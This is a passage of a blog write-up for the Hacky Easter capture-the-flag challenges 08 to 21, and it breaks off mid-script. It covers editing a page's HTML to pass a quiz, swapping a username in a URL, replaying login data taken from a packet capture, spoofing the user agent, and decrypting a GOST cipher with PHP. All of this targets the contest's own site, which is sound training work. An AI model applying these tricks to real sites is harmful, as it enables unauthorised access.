&lt;p&gt;Mobile challange. I need to navigate a Google street view style app to search for the
egg. I was actually surprised how easy it was to find. On the second screen
I looked up and there it was, in the sky. Easy right? Well, once I capped the image, I brought
it into Gimp and manipulated it. Took quite a bit of cleanup and contrast tweaking to get it to scan,
but I got there in the end.&lt;/p&gt;

&lt;h1 id=&#34;challenge-08:00aa8d5840836b6803fb0a2203b66750&#34;&gt;Challenge 08&lt;/h1&gt;

&lt;p&gt;So from a spreadsheet ID I have to find this particular spreadsheet? Like any sensible person
I avoid working with spreadsheets as much as I can, so I had to investigate how Google
docs uses these IDs. Luckily once you create a new sheet, you can already identify the ID in the URL.
Replace your ID with the Hacky Easter one and you are given the sheet.&lt;/p&gt;

&lt;p&gt;The problem is that the sheet is jumbled up. You need to order the colums and rows in numerical order.
I could have done this in Python, but at the time I got &lt;em&gt;1&lt;/em&gt; back for the black boxes. Being
a spreadsheet n00b I didn&amp;rsquo;t know about conditional formating, but you can specify cell formatting based
on content. So that would have been the easy way.&lt;/p&gt;

&lt;p&gt;Instead I did it manually. Ordering the rows can be done automatically. Then I just copy
pasted the colums in order and snapped the code. Tedious, but produces results.&lt;/p&gt;

&lt;h1 id=&#34;challenge-09:00aa8d5840836b6803fb0a2203b66750&#34;&gt;Challenge 09&lt;/h1&gt;

&lt;p&gt;Mobile challenge. The app&amp;rsquo;s splash screen is egg #9, but distorted. With some
skilled timing I screen capped it and imported it into Pixelmator, where I
used the bulge tool to undistort it enough to be able to scan it.&lt;/p&gt;

&lt;p&gt;Alternatively I could have grabbed the image out of the APK I reckon, but
this was simpler at the time.&lt;/p&gt;

&lt;h1 id=&#34;challenge-10:00aa8d5840836b6803fb0a2203b66750&#34;&gt;Challenge 10&lt;/h1&gt;

&lt;p&gt;Thumper&amp;rsquo;s got egg 10? Where could he have taken it? Initially I decided
to look in the other challenges and there is one challenge that has a banner
at the bottom. It is an advert for Thumper&amp;rsquo;s info sec training course. Clicking
the banner merely told me that &amp;lsquo;the egg is not in any challenge&amp;rsquo;. They knew we&amp;rsquo;d
come looking.&lt;/p&gt;

&lt;p&gt;So where else would people keep eggs? Of course, on the pages where you can see
the eggs each user has. The url for which is &lt;code&gt;http://hackyeaster.hacking-lab.com/hackyeaster/eggs.html?name=hops&lt;/code&gt;
so all we do it replace the user &lt;code&gt;hops&lt;/code&gt; with &lt;code&gt;Thumper&lt;/code&gt; and sure enough, that&amp;rsquo;s
where he&amp;rsquo;s hidden the egg.&lt;/p&gt;

&lt;h1 id=&#34;challenge-11:00aa8d5840836b6803fb0a2203b66750&#34;&gt;Challenge 11&lt;/h1&gt;

&lt;p&gt;I was expecting this to be a bit harder, but I just downloaded the files,
opened them up in Thunderbird and found a message with attachments. Downloading
the attachment gives you the egg.&lt;/p&gt;

&lt;h1 id=&#34;challenge-12:00aa8d5840836b6803fb0a2203b66750&#34;&gt;Challenge 12&lt;/h1&gt;

&lt;p&gt;A quiz! Simple of course. Well, this is Hacky Easter, so no. The fields are all
incorrectly configured. Look at the source and you can see:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Field 1 will change it contents when it loses focus.&lt;/li&gt;
&lt;li&gt;Field 2 is a number field but should be a string&lt;/li&gt;
&lt;li&gt;Field 3 is a text field but should be a number&lt;/li&gt;
&lt;li&gt;Field 4 is a radio button set, but should be checkboxes&lt;/li&gt;
&lt;li&gt;Field 5 is a dropdown that is missing the right answer&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;So I worked out the answers, as I still need to get them right, and then I used
Firebug to edit the HTML in place. Once ready I hit &lt;em&gt;Submit&lt;/em&gt; only to find I was
wrong. I am sure everything was correct though. I double checked the fields, and
then I noticed that the submit button had &lt;code&gt;value=&amp;quot;false&amp;quot;&lt;/code&gt; on it.&lt;/p&gt;

&lt;p&gt;Once I edited them all again and set the submit button to &lt;code&gt;true&lt;/code&gt; I was granted access
to the egg.&lt;/p&gt;

&lt;h1 id=&#34;challenge-13:00aa8d5840836b6803fb0a2203b66750&#34;&gt;Challenge 13&lt;/h1&gt;

&lt;p&gt;This challenge had me going for quite a while. A great example of how you learn
to observe information. Downloading the video I see a 15 minute video that has a
different QR code every second (approx). Each QR code resolves to a egg style
string, so there&amp;rsquo;s no automated way to filter out the right code.&lt;/p&gt;

&lt;p&gt;I can&amp;rsquo;t watch it and scan each egg, that would take forever. So I thought about
what I know. Eventually it dawned on me that it&amp;rsquo;s called &lt;em&gt;LEET TV&lt;/em&gt;. Leet = 7337.
I wonder if&amp;hellip; scrub the video to 7337 and scan the code. Error message.&lt;/p&gt;

&lt;p&gt;But careful, this isn&amp;rsquo;t the same message as you would get if you scan an invalid
egg. I used a different barcode scanner to scan this code and was given a URL. Result!&lt;/p&gt;

&lt;p&gt;Visiting the URL I download a wav file, which is clearly a reversed audio recording.&lt;/p&gt;

&lt;p&gt;Importing into Audacity, reversing it, and playing it back tells us the timestamp
in the video where the correct QR is shown.&lt;/p&gt;

&lt;h1 id=&#34;challenge-14:00aa8d5840836b6803fb0a2203b66750&#34;&gt;Challenge 14&lt;/h1&gt;

&lt;p&gt;On a hunch I just decided to use a 2d barcode scanner to scan the code and see
what happens. Oh, it gives us an egg string. But the app&amp;rsquo;s scanner will only accept
2d codes. Not to worry. Using duckduckgo&amp;rsquo;s qr code creator we can just enter the string
we get from the 1d code, and in return we get a 2d code which we can scan with the
Hacky Easter app.&lt;/p&gt;

&lt;h1 id=&#34;challenge-15:00aa8d5840836b6803fb0a2203b66750&#34;&gt;Challenge 15&lt;/h1&gt;

&lt;p&gt;This one was fiendish for me. In the end I actually took apart the APK and
disassembled the code to try and see what this does. From this I could see
that it stores the pics on your SD card. It also runs some analysis on the images,
based on the pixel values. I assumed that it was in fact looking for a picture
of a tomato and a grassy field.&lt;/p&gt;

&lt;p&gt;I took a picture of a green screen and managed to get it to return one half of the
code. The tomato was a bit trickier, as a simply red image was not enough. It actually
needed &lt;em&gt;some&lt;/em&gt; green in it. Google image search for &lt;em&gt;tomato&lt;/em&gt; and took a reasonalbe pic,
which gave me the other half of the code.&lt;/p&gt;

&lt;p&gt;After downloading the pics to my desktop, it was just a matter of joining them together
to give me the complete egg.&lt;/p&gt;

&lt;p&gt;Was a little bit hit and miss with the pic taking, but nice idea for a challenge.&lt;/p&gt;

&lt;h1 id=&#34;challenge-16:00aa8d5840836b6803fb0a2203b66750&#34;&gt;Challenge 16&lt;/h1&gt;

&lt;p&gt;&lt;em&gt;Ghosts only come out when it&amp;rsquo;s dark&amp;hellip;&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;This required a few things: a keen eye, and knowledge of crypto.&lt;/p&gt;

&lt;p&gt;So firstly we know that we need to make it dark or something. After a while
I finally noticed the light bulb at the bottom right of the main
challenges page. Clicking that makes the page dark and changes the thumbnail for
challenge 16. Now when we click on it we get a set of 4 strings and picture of
a &amp;ldquo;The Ring&amp;rdquo; girl with the word &lt;em&gt;spooky&lt;/em&gt; written across it. We are also told:&lt;/p&gt;

&lt;p&gt;&lt;em&gt;Dark is beautiful. A GOST with chaining appears and has a message for you&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;Nothing is a coincidence, so that&amp;rsquo;s no typo. Searching for &lt;em&gt;GOST&lt;/em&gt; I discovered that
it was an encryption method. After quite a bit more searching I discovered that
PHP&amp;rsquo;s mcrypt library supports decrypting this cipher. The cipher requires a
key. On a hunch I decided to use the only other clue available: &lt;em&gt;spooky&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;Now this is where I almost failed. I could decrypt the first code without any
problem. It resulted in the string &lt;code&gt;http://hackyeas&lt;/code&gt;. But the second string&amp;rsquo;s
first 8 characters were corrupt. I was so stuck until I discovered that
you had to append all the ciphers together in order to get the plaintext. I guess
that&amp;rsquo;s the &lt;code&gt;chaining&lt;/code&gt; part, as well as indicating we should used &lt;code&gt;MCRYPT_MODE_CBC&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;This PHP script ended up doing the work for me&lt;/p&gt;

&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;&lt;span style=&#34;color: #75715e&#34;&gt;&amp;lt;?php&lt;/span&gt;
&lt;span style=&#34;color: #f8f8f2&#34;&gt;$hash1&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;base64_decode(&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;#39;d5++xytj6RiGwmqEecm63Kow7RZGAAHh&amp;#39;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;);&lt;/span&gt;
&lt;span style=&#34;color: #f8f8f2&#34;&gt;$hash2&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;base64_decode(&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;#39;VFsksHFuj/Anap7pWHDZ1XQw8DAApUEN&amp;#39;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;);&lt;/span&gt;
&lt;span style=&#34;color: #f8f8f2&#34;&gt;$hash3&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;base64_decode(&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;#39;R5ExOGUKTzGOtvSAlCHkHq6NneL6ZUTX&amp;#39;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;);&lt;/span&gt;
&lt;span style=&#34;color: #f8f8f2&#34;&gt;$hash4&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;base64_decode(&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;#39;ej8Taxz+kHK9w9U8dxTOSksZ4HKS2YYD&amp;#39;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;);&lt;/span&gt;

&lt;span style=&#34;color: #f8f8f2&#34;&gt;$res&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;mcrypt_decrypt(&lt;/span&gt;&lt;span style=&#34;color: #a6e22e&#34;&gt;MCRYPT_GOST&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;#39;spooky&amp;#39;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;$hash1&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;$hash2&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;$hash3&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;$hash4,&lt;/span&gt; &lt;span style=&#34;color: #a6e22e&#34;&gt;MCRYPT_MODE_CBC&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;);&lt;/span&gt;
&lt;span style=&#34;color: #66d9ef&#34;&gt;echo&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;base64_encode($res)&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Running it:&lt;/p&gt;

&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;$&amp;gt; php ./gost.php &lt;span style=&#34;color: #f8f8f2&#34;&gt;|&lt;/span&gt; base64 -d
http://hackyeaster.hacking-lab.com/hackyeaster/images/egg_16_a3eIIACKSy02sJ6LxXeh.png
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;No initialisation vector was required, so you can ignore the warning.&lt;/p&gt;

&lt;h1 id=&#34;challenge-17:00aa8d5840836b6803fb0a2203b66750&#34;&gt;Challenge 17&lt;/h1&gt;

&lt;p&gt;There&amp;rsquo;s no real way to spot the difference in the images with your eyes. So the
easiest way is to bring them into Gimp on separate layers. Then I adjusted the top
layer&amp;rsquo;s blend mode to &amp;ldquo;difference&amp;rdquo; so that I could see which pixels differ. The image
goes black indicating that there&amp;rsquo;s no differences. Impossible!&lt;/p&gt;

&lt;p&gt;Now thinking that there must be differences I figured that they might be so small
that they appear black. I maxed the contrast and brightness to get:&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;http://i.imgur.com/0iAoovp.jpg&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;Now the QR code is in the left eye, and a target shape in the right. The target
needs to be used to invert the pixels in the QR code. Once done, snap the code
and move on.&lt;/p&gt;

&lt;h1 id=&#34;challenge-18:00aa8d5840836b6803fb0a2203b66750&#34;&gt;Challenge 18&lt;/h1&gt;

&lt;p&gt;Once we visit the site we get asked to authenticate. No doubt the details will be in
the pcap file, so let&amp;rsquo;s open that. We can see a failed auth followed by a successful
one. Inspect the relevant packet and we get the login:&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;http://i.imgur.com/dhLNYS9.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;Using this to login we are presented with another login form. Trying the same
credentials gives a &amp;ldquo;Payment required&amp;rdquo; page. Heading back to the pcap file let&amp;rsquo;s
see if we can&amp;rsquo;t find some details for this part too. Ah, right there at the bottom.&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;http://i.imgur.com/Gp45s1R.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;This time however we need to pass the hash and login details via POST. Either
edit the form, or use a tool like Zap or Burp proxy, to add this data to the POST
and we have our egg.&lt;/p&gt;

&lt;h1 id=&#34;challenge-19:00aa8d5840836b6803fb0a2203b66750&#34;&gt;Challenge 19&lt;/h1&gt;

&lt;p&gt;Not found.&lt;/p&gt;

&lt;p&gt;I will add a solution here later.&lt;/p&gt;

&lt;h1 id=&#34;challenge-20:00aa8d5840836b6803fb0a2203b66750&#34;&gt;Challenge 20&lt;/h1&gt;

&lt;p&gt;The big clue here is robots. Why do we love robots? &lt;code&gt;robots.txt&lt;/code&gt; is why. Taking a
look at it I can see&lt;/p&gt;

&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;User-agent: EasterBot
Disallow: /
Allow: /hackyeaster/bots/bots.

User-agent: *
Disallow: /
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Visiting the url &lt;code&gt;/hackyeaster/bots/bots.html&lt;/code&gt; takes me to the CP30 Wiki page. That can&amp;rsquo;t be right. So I decided
to spoof my user agent to be &lt;code&gt;EasterBot&lt;/code&gt; and I get a different result. An image
with the following text&lt;/p&gt;

&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;BAMA WABOKI PISAL FATATU FOMU WOSEBI SEJU SOWU SEJU - BAMAS MUFE WAFUB FOMU MOWEWE
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Hrmm. I tried to decipher this many ways before I gave up and Googled it. It turns
out this is actually &lt;a href=&#34;http://roila.org/language-guide/vocabulary/&#34;&gt;ROILA&lt;/a&gt; and
comes with a nice dictionary. So I set about translating it and got:&lt;/p&gt;

&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;you must make word of addition two and two - this be name of page
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Right, so I add two and two to give four and I load up
&lt;code&gt;http://hackyeaster.hacking-lab.com//hackyeaster/bots/four.html&lt;/code&gt; and see Gir with the
word &lt;code&gt;MetAE&lt;/code&gt;. Well meta can only mean I need to look at the page metadata. Viewing the source
I see&lt;/p&gt;

&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;&lt;span style=&#34;color: #f92672&#34;&gt;&amp;lt;meta&lt;/span&gt; &lt;span style=&#34;color: #a6e22e&#34;&gt;name=&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;description&amp;quot;&lt;/span&gt; &lt;span style=&#34;color: #a6e22e&#34;&gt;content=&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;Robots talk in ROILA language: eman egap eht esrever tsum&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;span style=&#34;color: #f92672&#34;&gt;&amp;lt;meta&lt;/span&gt; &lt;span style=&#34;color: #a6e22e&#34;&gt;name=&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;keywords&amp;quot;&lt;/span&gt; &lt;span style=&#34;color: #a6e22e&#34;&gt;content=&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;secret, page, robots, fun, hacky easter, blrt, five, beep&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;More ROILA? No, it&amp;rsquo;s just backwards english. I&amp;rsquo;ll just go to
&lt;code&gt;http://hackyeaster.hacking-lab.com//hackyeaster/bots/ruof.html&lt;/code&gt; and get the egg/&lt;/p&gt;

&lt;h1 id=&#34;challenge-21:00aa8d5840836b6803fb0a2203b66750&#34;&gt;Challenge 21&lt;/h1&gt;

&lt;p&gt;I am told that &lt;code&gt;blue&lt;/code&gt; is &lt;code&gt;110&lt;/code&gt;. I took a guess that therefore red will be &lt;code&gt;011&lt;/code&gt; and
green &lt;code&gt;101&lt;/code&gt;. Basically the binary represents the RGB values inverted. Applying this
I wrote a script to translate the colours to a binary string and then conver that to ASCII
which gave me the egg&amp;rsquo;s URL.&lt;/p&gt;

&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;&lt;span style=&#34;color: #75715e&#34;&gt;#!/bin/env python&lt;/span&gt;
&lt;span style=&#34;color: #f92672&#34;&gt;from&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;PIL&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;Image&lt;/span&gt;

&lt;span style=&#34;color: #f8f8f2&#34;&gt;codes&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;#39;111&amp;#39;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;#39;110&amp;#39;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;#39;101&amp;#39;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;#39;100&amp;#39;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;#39;011&amp;#39;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;#39;010&amp;#39;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;#39;001&amp;#39;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;#39;000&amp;#39;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;]&lt;/span&gt;

&lt;span style=&#34;color: #f8f8f2&#34;&gt;im&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;Image&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;open(&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;#39;conycode.png&amp;#39;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;)&lt;/span&gt;
&lt;span style=&#34;color: #66d9ef&#34;&gt;print&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;im&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;size&lt;/span&gt;
&lt;span style=&#34;color: #66d9ef&#34;&gt;print&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;im&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;size[&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;]&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;14.0&lt;/span&gt;
&lt;span style=&#34;color: #f8f8f2&#34;&gt;pixels&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;list(im&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;getdata())&lt;/span&gt;
&lt;span style=&#34;color: #66d9ef&#34;&gt;print&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;pixels[im&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;size[&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;]]&lt;/span&gt;
&lt;span style=&#34;color: #66d9ef&#34;&gt;print&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;pixels[im&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;size[&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;]&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;18&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color: #ae81ff&#34;&gt;12&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;)]&lt;/span&gt;
&lt;span style=&#34;color: #66d9ef&#34;&gt;print&lt;/span&gt;

&lt;span style=&#34;color: #f8f8f2&#34;&gt;output&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;[]&lt;/span&gt;
&lt;span style=&#34;color: #66d9ef&#34;&gt;for&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;h&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;in&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;xrange(&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;im&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;size[&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;],&lt;/span&gt; &lt;span style=&#34;color: #ae81ff&#34;&gt;18&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;):&lt;/span&gt;
    &lt;span style=&#34;color: #66d9ef&#34;&gt;for&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;w&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;in&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;xrange(&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;im&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;size[&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;],&lt;/span&gt; &lt;span style=&#34;color: #ae81ff&#34;&gt;18&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;):&lt;/span&gt;
        &lt;span style=&#34;color: #f8f8f2&#34;&gt;output&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;append(codes[pixels[w&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;(im&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;size[&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;h)]])&lt;/span&gt;

&lt;span style=&#34;color: #f92672&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;sys&lt;/span&gt;

&lt;span style=&#34;color: #f8f8f2&#34;&gt;bin_string&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;join(output)&lt;/span&gt;
&lt;span style=&#34;color: #66d9ef&#34;&gt;print&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;len(bin_string)&lt;/span&gt;
&lt;span style=&#34;color: #66d9ef&#34;&gt;for&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;x&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;in&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;xrange(&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;len(bin_string),&lt;/span&gt; &lt;span style=&#34;color: #ae81ff&#34;&gt;8&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;):&lt;/span&gt;
    &lt;span style=&#34;color: #f8f8f2&#34;&gt;t&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;int(bin_string[x:x&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;8&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;],&lt;/span&gt; &lt;span style=&#34;color: #ae81ff&#34;&gt;2&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;)&lt;/span&gt;
    &lt;span style=&#34;color: #f8f8f2&#34;&gt;ba&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;bytearray([t])&lt;/span&gt;
